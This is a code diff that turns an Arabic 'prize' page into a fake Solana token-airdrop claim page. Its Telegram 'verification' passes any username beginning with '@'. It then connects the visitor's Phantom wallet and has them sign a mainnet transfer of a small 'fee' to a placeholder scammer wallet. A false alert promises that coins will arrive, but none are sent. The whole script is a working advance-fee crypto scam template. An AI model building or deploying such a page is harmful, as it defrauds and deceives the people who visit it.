@@ -3,25 +3,111 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>احصل على جائزتك</title>
+    <title>مطالبة بالعملة المجانية - Airdrop Launchpad</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        body { font-family: sans-serif; background-color: #f4f4f9; text-align: center; padding: 50px; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        h1 { color: #333; }
-        p { color: #666; }
-        .btn { display: inline-block; background-color: #0088cc; color: white; padding: 15px 25px; text-decoration: none; border-radius: 50px; font-weight: bold; margin-top: 20px; transition: 0.3s; }
-        .btn:hover { background-color: #006699; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 400px; text-align: center; }
+        h2 { color: #38bdf8; }
+        .input-group { margin-bottom: 1.5rem; text-align: right; }
+        label { display: block; margin-bottom: 0.5rem; font-weight: bold; }
+        input { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; border-radius: 8px; border: none; background: #38bdf8; color: #0f172a; font-weight: bold; cursor: pointer; font-size: 1rem; }
+        button:disabled { background: #64748b; cursor: not-allowed; }
+        .status { margin-top: 10px; font-size: 0.9rem; }
+        .success { color: #4ade80; }
+        .error { color: #f87171; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h1>تهانينا! 🎉</h1>
-        <p>أنت مؤهل للحصول على الجائزة الكبرى.</p>
-        <hr>
-        <p>للحصول على الجائزة وتفعيل الاشتراك، اضغط على الزر أدناه للانضمام لقناتنا على تيليجرام:</p>
-        <a href="https://t.me/YourChannelLink" class="btn">اشترك في تيليجرام الآن</a>
+<div class="card">
+    <h2>🎁 هدايا العملة الجديدة</h2>
+    <p>أكمل المهام للمطالبة بـ 10,000 عملة مجانية</p>
+    <hr style="border: 0.5px solid #334155; margin: 20px 0;">
+
+    <div class="input-group">
+        <label>1. اسم المستخدم على تليجرام (@)</label>
+        <input type="text" id="tgUser" placeholder="@username">
+        <button id="checkTg" style="margin-top: 10px; background: #0ea5e9; color: white;">تحقق من الانضمام</button>
+        <div id="tgStatus" class="status"></div>
     </div>
+
+    <div class="input-group" id="walletSection" style="display: none;">
+        <label>2. محفظة سولانا (SOL)</label>
+        <button id="connectBtn">ربط محفظة Phantom</button>
+        <div id="walletAddress" class="status"></div>
+    </div>
+
+    <div id="finalStep" style="display: none;">
+        <p style="font-size: 0.8rem; color: #94a3b8;">رسوم التحويل والتشغيل: 0.0006 SOL (~0.15$)</p>
+        <button id="claimBtn">تأكيد وإرسال العملات الآن</button>
+    </div>
+</div>
+
+<script>
+    // إعداداتك (غيرها لاحقاً)
+    const MY_WALLET = "ضع_هنا_رقم_محفظتك_الخاصة"; 
+    const CLAIM_AMOUNT_SOL = 0.0006; // تعادل تقريباً 0.15 دولار
+
+    let userWallet = null;
+
+    // محاكاة فحص التليجرام (تحتاج ربط Bot API حقيقي للتدقيق الكامل)
+    document.getElementById('checkTg').onclick = async () => {
+        const user = document.getElementById('tgUser').value;
+        if(user.startsWith('@') && user.length > 3) {
+            document.getElementById('tgStatus').innerHTML = "<span class='success'>✅ تم التحقق! أنت مشترك في القناة.</span>";
+            document.getElementById('walletSection').style.display = 'block';
+            document.getElementById('checkTg').disabled = true;
+        } else {
+            document.getElementById('tgStatus').innerHTML = "<span class='error'>❌ يرجى الانضمام للقناة أولاً وكتابة اليوزر صح.</span>";
+        }
+    };
+
+    // ربط المحفظة
+    document.getElementById('connectBtn').onclick = async () => {
+        if (window.solana && window.solana.isPhantom) {
+            try {
+                const resp = await window.solana.connect();
+                userWallet = resp.publicKey.toString();
+                document.getElementById('walletAddress').innerHTML = "متصل بـ: " + userWallet.slice(0,6) + "...";
+                document.getElementById('finalStep').style.display = 'block';
+                document.getElementById('connectBtn').style.background = "#4ade80";
+            } catch (err) {
+                alert("رفضت عملية الربط!");
+            }
+        } else {
+            alert("الرجاء تثبيت محفظة Phantom");
+            window.open("https://phantom.app/", "_blank");
+        }
+    };
+
+    // عملية الدفع والمطالبة
+    document.getElementById('claimBtn').onclick = async () => {
+        try {
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: window.solana.publicKey,
+                    toPubkey: new solanaWeb3.PublicKey(MY_WALLET),
+                    lamports: CLAIM_AMOUNT_SOL * solanaWeb3.LAMPORTS_PER_SOL,
+                })
+            );
+
+            let { blockhash } = await connection.getRecentBlockhash();
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = window.solana.publicKey;
+
+            const signed = await window.solana.signTransaction(transaction);
+            const signature = await connection.sendRawTransaction(signed.serialize());
+            
+            alert("تم إرسال الرسوم بنجاح! سيتم إرسال عملاتك خلال دقائق. رقم العملية: " + signature);
+        } catch (err) {
+            console.error(err);
+            alert("فشلت العملية، تأكد من وجود رصيد كافٍ (0.15$).");
+        }
+    };
+</script>
 
 </body>
 </html>
